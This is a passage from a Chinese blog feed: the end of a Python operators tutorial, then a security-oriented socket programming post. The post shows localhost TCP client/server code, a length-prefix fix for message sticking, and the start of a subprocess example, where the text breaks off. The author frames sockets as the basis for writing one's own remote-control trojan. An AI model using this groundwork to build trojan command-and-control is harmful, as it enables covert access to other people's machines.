<span class="keyword">and</span> <span class="number">10</span> &gt; <span class="number">1</span>) <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span> &gt; <span class="number">3</span> <span class="keyword">and</span> <span class="number">4</span> &gt; <span class="number">8</span> <span class="keyword">and</span> <span class="literal">False</span> )</span><br></pre></td></tr></table></figure><h3 id="（3）-or"><a href="#（3）-or" class="headerlink" title="（3） or"></a>（3） or</h3><p>or ( 逻辑或 ) 用来连接左右两个条件, 两个条件但凡有一个为True, 最终结果就为True, 两个条件都为False的情况, 最终结果才为False。</p><p>如果连接多个条件, 条件全为假, 最终结果才是False。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">3</span> &gt; <span class="number">2</span> <span class="keyword">or</span> <span class="literal">False</span>) <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="literal">False</span> <span class="keyword">or</span> <span class="number">6</span> &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="number">7</span> &gt; <span class="number">99</span>) <span class="comment">#False</span></span><br></pre></td></tr></table></figure><h2 id="3、-逻辑运算符的优先级-了解"><a href="#3、-逻辑运算符的优先级-了解" class="headerlink" title="3、 逻辑运算符的优先级 (了解)"></a>3、 逻辑运算符的优先级 (了解)</h2><p>如果单独的就只是一串and&#x2F;or连接, 按照从左到右的顺序依次运算即可。如果是混合使用就要考虑优先级了。</p><h3 id="（1）-优先级"><a href="#（1）-优先级" class="headerlink" title="（1） 优先级"></a>（1） 优先级</h3><p>括号<code> ( ) &gt; not &gt; and &gt; or</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">3</span> &gt; <span class="number">4</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="number">4</span> &gt; <span class="number">3</span> <span class="keyword">or</span> <span class="number">1</span> == <span class="number">3</span> <span class="keyword">and</span> <span class="string">&#x27;x&#x27;</span> == <span class="string">&#x27;x&#x27;</span> <span class="keyword">or</span> <span class="number">3</span> &gt; <span class="number">3</span>) <span class="comment"># False</span></span><br></pre></td></tr></table></figure><p>这种混合运算一般不会出现在自己代码里, 只有面试题你会见到</p><p>小练习:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">not</span> <span class="number">3</span> &gt; <span class="number">4</span> <span class="keyword">and</span> <span class="number">5</span> &gt; <span class="number">7</span> <span class="keyword">or</span> <span class="number">7</span> &gt; <span class="number">9</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="number">3</span> == <span class="number">3</span> <span class="keyword">and</span> x==<span class="string">&#x27;x&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span> &gt; <span class="number">4</span> <span class="keyword">and</span> <span class="number">5</span> &gt; <span class="number">7</span> <span class="keyword">and</span> <span class="number">7</span> &gt; <span class="number">9</span> <span class="keyword">or</span> <span class="keyword">not</span> <span class="number">3</span> == <span class="number">3</span> <span class="keyword">and</span> x==<span class="string">&#x27;x&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="4、短路运算"><a href="#4、短路运算" class="headerlink" title="4、短路运算"></a>4、短路运算</h2><p>短路运算：遵循偷懒原则，偷懒到哪个位置，就把当前位置的值返回。在面试题中，一般和逻辑运算符优先级一起考。注意一点，返回的值不一定是显示的布尔值，可能是隐式的布尔值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span> &gt; <span class="number">3</span> <span class="keyword">and</span> <span class="literal">True</span>     <span class="comment"># 偷懒到True,所以返回True</span></span><br><span class="line"><span class="number">10</span> &lt; <span class="number">100</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">and</span> <span class="literal">True</span> <span class="comment"># 偷懒到0,返回0</span></span><br><span class="line"><span class="number">10</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">or</span> <span class="number">1</span> &gt; <span class="number">3</span> <span class="keyword">and</span> <span class="number">9</span> == <span class="number">9</span> <span class="keyword">or</span> <span class="number">80</span> &gt; <span class="number">70</span> <span class="comment"># 先看优先级,然后再看每个部分偷懒到哪里,然后再算最后的值 True</span></span><br></pre></td></tr></table></figure><h1 id="五、成员运算符"><a href="#五、成员运算符" class="headerlink" title="五、成员运算符"></a>五、成员运算符</h1><h2 id="1、-in"><a href="#1、-in" class="headerlink" title="1、 in"></a>1、 in</h2><p>成员运算符就是判断是否存在, 返回一个布尔值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 判断一个小字符串是否在一个大字符串中</span></span><br><span class="line"><span class="built_in">print</span>( <span class="string">&#x27;x&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;zhenxiang&#x27;</span> ) <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断元素是否存在于列表</span></span><br><span class="line"><span class="built_in">print</span>( <span class="number">10</span> <span class="keyword">in</span> [<span class="number">11</span>,<span class="number">10</span>,<span class="number">12</span>]) <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断key是否存在于字典</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;k1&#x27;</span> <span class="keyword">in</span> &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">1</span>&#125;) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h2 id="2、-not-in"><a href="#2、-not-in" class="headerlink" title="2、 not in"></a>2、 not in</h2><p>判断是否不在，一般判断不存在时，推荐使用这种。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>( <span class="string">&#x27;mn&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&#x27;hello word&#x27;</span>) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h1 id="六、-身份运算符"><a href="#六、-身份运算符" class="headerlink" title="六、 身份运算符"></a>六、 身份运算符</h1><h2 id="1、-is"><a href="#1、-is" class="headerlink" title="1、 is"></a>1、 is</h2><p>is 就是身份运算符, 判断的是id是否相等, id( ) , 在cpython中返回的是程序运行时, 对象在内存中的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&#x27;hello mn&#x27;</span></span><br><span class="line">y = <span class="string">&#x27;hello mn&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(x <span class="keyword">is</span> y) <span class="comment"># True</span></span><br><span class="line"><span class="comment"># 但记住有的时候值相等未必id相等</span></span><br></pre></td></tr></table></figure><h2 id="2、-is-not"><a href="#2、-is-not" class="headerlink" title="2、 is not"></a>2、 is not</h2><p>判断身份不相同</p>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Socket编程（偏安全方面）</title>
      <link href="/2022/04/05/socket_study/"/>
      <url>/2022/04/05/socket_study/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/66ed1bfc75b24752a7ab1fe293bb8013.png" alt="在这里插入图片描述"><br>&#x3D;&#x3D;本篇文章仅用于学习记录和交流，不得用于其他违规用途，产生的不良后果，自己负责。&#x3D;&#x3D;</p><h1 id="一、Socket介绍"><a href="#一、Socket介绍" class="headerlink" title="一、Socket介绍"></a>一、Socket介绍</h1><p>首先socket (套接字) 是工作在应用层和传输层之间一个抽像层 , 为什么要有他呢 ? 虽然我们已经有了ip+port可以和世界上任意一台计算机上的软件通信了 , 但是需要我们自己构造数据 , 以及封包 , 以及如何转换成2进制 . 相当麻烦 , 不利于开发 , 于是有了socket , 这个对数据封装的复杂工作交给他完成就好了 , 我们只需要调用相关接口就ok了 , 同样收数据也是基于socket层<br><img src="http://120.48.107.243:9090/blog/2023/04/03/368dcae8ca9443cfb2afbed9ae3d0470.png" alt="在这里插入图片描述"><br>所以我们无论用什么编程语言去开发网络通信的软件都不会自己封包解包 , 都是基于套接字的实现的 , 同样最后当应用层的数据传输结束了 , 你要在合适的地方用socket把系统资源给释放了<br>##1、为什么学习socket<br>或者说用socket我们能实现什么 ? socket可以帮助我们解决两个软件之间的通信问题 , 大家都知道ip可以定位一台电脑  , 那么电脑上那么多软件我的软件怎么知道要跟另一个软件通信而不是和qq通信? 这就引出来了端口 , ip+port可以定位到你电脑上的某个应用程序(软件) , 大家都知道端口是不能重复的 </p><p>你想一想远控(c2)是不是也是两个软件的通信? 木马和控制端的通信 , 不管你用的什么协议 底层都是socket之间的通信 , 只不过在上面规范了一些数据包的传输而已 , 所以我们也可以自己基于socket编写远控<br>##2、套接字发展史及分类<br>套接字起源于 20 世纪 70 年代加利福尼亚大学伯克利分校版本的 Unix,即人们所说的 BSD Unix。 因此,有时人们也把套接字称为“伯克利套接字”或“BSD 套接字”。一开始,套接字被设计用在同 一台主机上多个应用程序之间的通讯。这也被称进程间通讯,或 IPC。套接字有两种（或者称为有两个种族）,分别是基于文件型的和基于网络型的。</p><p><strong>基于文件类型的套接字家族</strong></p><p>套接字家族的名字：AF_UNIX</p><p>unix一切皆文件，基于文件的套接字调用的就是底层的文件系统来取数据，两个套接字进程运行在同一机器，可以通过访问同一个文件系统间接完成通信</p><p><strong>基于网络类型的套接字家族</strong></p><p>套接字家族的名字：AF_INET</p><p>(还有AF_INET6被用于ipv6，还有一些其他的地址家族，不过，他们要么是只用于某个平台，要么就是已经被废弃，或者是很少被使用，或者是根本没有实现，所有地址家族中，AF_INET是使用最广泛的一个，python支持很多种地址家族，但是由于我们只关心网络编程，所以大部分时候我么只使用AF_INET)</p><h2 id="3、套接字工作流程"><a href="#3、套接字工作流程" class="headerlink" title="3、套接字工作流程"></a>3、套接字工作流程</h2><p>一个生活中的场景。你要打电话给一个朋友，先拨号，朋友听到电话铃声后提起电话，这时你和你的朋友就建立起了连接，就可以讲话了。等交流结束，挂断电话结束此次交谈。 生活中的场景就解释了这工作原理。<br>先从服务器端说起。服务器端先初始化Socket，然后与端口绑定(bind)，对端口进行监听(listen)，调用accept阻塞，等待客户端连接。在这时如果有个客户端初始化一个Socket，然后连接服务器(connect)，如果连接成功，这时客户端与服务器端的连接就建立了。客户端发送数据请求，服务器端接收请求并处理请求，然后把回应数据发送给客户端，客户端读取数据，最后关闭连接，一次交互结束<br>#二、TCP套接字<br>##1、单次通信<br>客户端代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 客户端</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="comment"># 1.买手机</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="comment"># 基于网络 , tcp协议,默认不写也是这个</span></span><br><span class="line"><span class="comment"># 2.打电话,前提要知道对方的ip和port</span></span><br><span class="line">sock.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">8080</span>))</span><br><span class="line"><span class="comment"># 3.发送数据</span></span><br><span class="line">sock.send(<span class="string">b&#x27;hello word&#x27;</span>)   <span class="comment"># 发送的数据必须是bytes类型</span></span><br><span class="line"><span class="comment"># 4.关闭</span></span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure><p>服务端代码</p><h1 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h1><p>i</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.买手机</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  <span class="comment"># 基于网络 , tcp协议,默认不写也是这个</span></span><br><span class="line"><span class="comment"># 2.绑定手机卡</span></span><br><span class="line">sock.bind((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8080</span>))  <span class="comment"># 1024以前都被系统占用了</span></span><br><span class="line"><span class="comment"># 3.开机</span></span><br><span class="line">sock.listen(<span class="number">5</span>)  <span class="comment"># 半连接池允许的个数5</span></span><br><span class="line"><span class="comment"># 4.等待连接请求</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;等待客户端连接......&quot;</span>)</span><br><span class="line">conn, client_addr = sock.accept()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;建立了一个管道: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(conn))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;客户端的地址: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(client_addr))</span><br><span class="line"><span class="comment"># 5.接收数据</span></span><br><span class="line">msg = conn.recv(<span class="number">1024</span>) <span class="comment"># 最大接收的数据量为1024个字节,收到的是bytes类型</span></span><br><span class="line"><span class="comment"># 6.打印数据</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;接收到的数据 : <span class="subst">&#123;msg.decode()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># 7.关闭管道连接(必选,回收资源的操作)</span></span><br><span class="line">conn.close()</span><br><span class="line"><span class="comment"># 8.关闭服务端sock对象(可选)</span></span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure><h2 id="2、通信循环"><a href="#2、通信循环" class="headerlink" title="2、通信循环"></a>2、通信循环</h2><p>客户端代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 客户端</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.买手机</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  <span class="comment"># 基于网络 , tcp协议,默认不写也是这个</span></span><br><span class="line"><span class="comment"># 2.打电话,前提要知道对方的ip和port</span></span><br><span class="line">sock.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8080</span>))</span><br><span class="line"><span class="comment"># 3.发送数据</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    data = <span class="built_in">input</span>(<span class="string">&#x27;请输入你要发送的数据&gt;&gt;&gt;&#x27;</span>).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data: <span class="keyword">continue</span></span><br><span class="line">    sock.send(data.encode())</span><br><span class="line">    msg = sock.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(msg)</span><br></pre></td></tr></table></figure><p>服务端代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.买手机</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  <span class="comment"># 基于网络 , tcp协议,默认不写也是这个</span></span><br><span class="line"><span class="comment"># 2.绑定手机卡</span></span><br><span class="line">sock.bind((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8080</span>)) </span><br><span class="line"><span class="comment"># 3.开机</span></span><br><span class="line">sock.listen(<span class="number">5</span>)</span><br><span class="line"><span class="comment"># 4.等待连接请求</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;等待客户端连接......&quot;</span>)</span><br><span class="line">conn, client_addr = sock.accept()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 5.接收数据</span></span><br><span class="line">        msg = conn.recv(<span class="number">1024</span>).decode()  <span class="comment"># 最大接收的数据量为1024个字节,收到的是bytes类型</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> msg: <span class="keyword">break</span>  <span class="comment"># 如果msg为空,意味是一种异常的行为,客户端非法断开,此时应该断开链接</span></span><br><span class="line">        <span class="comment"># 6.打印数据</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;接收到的数据 : <span class="subst">&#123;msg&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># 7.回复客户端数据</span></span><br><span class="line">        conn.send(msg.upper().encode())</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="comment"># 针对win</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">conn.close()</span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;出现了粘包问题。&#x3D;&#x3D;<br>只有TCP有粘包现象，UDP永远不会粘包。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">例如基于tcp的套接字客户端往服务端上传文件，发送时文件内容是按照一段一段的字节流发送的，在接收方看了，根本不知道该文件的字节流从何处开始，在何处结束</span><br><span class="line"></span><br><span class="line">所谓粘包问题主要还是因为接收方不知道消息之间的界限，不知道一次性提取多少字节的数据所造成的。</span><br><span class="line"></span><br><span class="line">此外，发送方引起的粘包是由TCP协议本身造成的，TCP为提高传输效率，发送方往往要收集到足够多的数据后才发送一个TCP段。若连续几次需要send的数据都很少，通常TCP会根据优化算法把这些数据合成一个TCP段后一次发送出去，这样接收方就收到了粘包数据。</span><br></pre></td></tr></table></figure><p>解决：<br>客户端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_data</span>(<span class="params">sock, buf_size=<span class="number">1024</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解决粘包&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 先接受命令执行结果的长度</span></span><br><span class="line">    x = sock.recv(<span class="number">4</span>)</span><br><span class="line">    all_size = struct.unpack(<span class="string">&#x27;i&#x27;</span>, x)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 接收真实数据</span></span><br><span class="line">    recv_size = <span class="number">0</span></span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> recv_size &lt; all_size:</span><br><span class="line">        data += sock.recv(buf_size)</span><br><span class="line">        recv_size += buf_size</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">sock, data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;发送数据也解决粘包问题&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(data) == <span class="built_in">str</span>:</span><br><span class="line">        data = data.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment"># 新增发送命令的粘包解决方案</span></span><br><span class="line">    <span class="comment"># 计算命令长度 , 打包发送</span></span><br><span class="line">    cmd_len = struct.pack(<span class="string">&#x27;i&#x27;</span>, <span class="built_in">len</span>(data))</span><br><span class="line">    sock.send(cmd_len)</span><br><span class="line">    <span class="comment"># 发送命令</span></span><br><span class="line">    sock.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    client = socket.socket()</span><br><span class="line">    client.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8082</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 新增解包接收命令</span></span><br><span class="line">            msg = recv_data(client)  <span class="comment"># 接收对面传来的数据</span></span><br><span class="line">            <span class="keyword">if</span> msg == <span class="string">b&quot;q&quot;</span>:<span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(msg.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">            <span class="comment"># 发送内容</span></span><br><span class="line">            msg = <span class="built_in">input</span>(<span class="string">&quot;请输入你要回复的内容:&quot;</span>).strip()</span><br><span class="line">            send_data(client, msg)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    client.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>服务端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_data</span>(<span class="params">sock, buf_size=<span class="number">1024</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解决粘包&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 先接受命令执行结果的长度</span></span><br><span class="line">    x = sock.recv(<span class="number">4</span>)</span><br><span class="line">    all_size = struct.unpack(<span class="string">&#x27;i&#x27;</span>, x)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 接收真实数据</span></span><br><span class="line">    recv_size = <span class="number">0</span></span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> recv_size &lt; all_size:</span><br><span class="line">        data += sock.recv(buf_size)</span><br><span class="line">        recv_size += buf_size</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">sock, data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;发送数据也解决粘包问题&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(data) == <span class="built_in">str</span>:</span><br><span class="line">        data = data.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment"># 新增发送命令的粘包解决方案</span></span><br><span class="line">    <span class="comment"># 计算命令长度 , 打包发送</span></span><br><span class="line">    cmd_len = struct.pack(<span class="string">&#x27;i&#x27;</span>, <span class="built_in">len</span>(data))</span><br><span class="line">    sock.send(cmd_len)</span><br><span class="line">    <span class="comment"># 发送命令</span></span><br><span class="line">    sock.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    server = socket.socket()</span><br><span class="line">    server.bind((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8082</span>))</span><br><span class="line">    server.listen(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;等待链接.....&quot;</span>)</span><br><span class="line">    conn, c_addr = server.accept()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;新建一个链接,链接管道为<span class="subst">&#123;conn&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;当前客户端的地址为<span class="subst">&#123;c_addr&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">input</span>(<span class="string">f&#x27;请输入你要发送的内容&gt;&#x27;</span>).strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:<span class="keyword">continue</span></span><br><span class="line">            send_data(conn,data)</span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">&quot;q&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># 接收客户端发来的内容</span></span><br><span class="line">            data = recv_data(conn)</span><br><span class="line">            <span class="built_in">print</span>(data.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    conn.close()</span><br><span class="line">    server.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;注意：客户端可以发送空，服务端这边不能接受空。&#x3D;&#x3D;<br>#三、Subprocess模块<br>这个模块也是一个内置模块，相对于os.system，可以控制系统命令执行后的输出的编码方式，达不到乱码。<br>例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">obj = subprocess.Popen(<span class="string">&quot;whoami&quot;</span>, shell=<span class="literal">True</span>,</span><br><span class="line">                       stdout=subprocess.PIPE, <span class="comment"># 标准正确输出</span></span><br><span class="line">                       stderr=subprocess.PIPE) <span class="comment"># 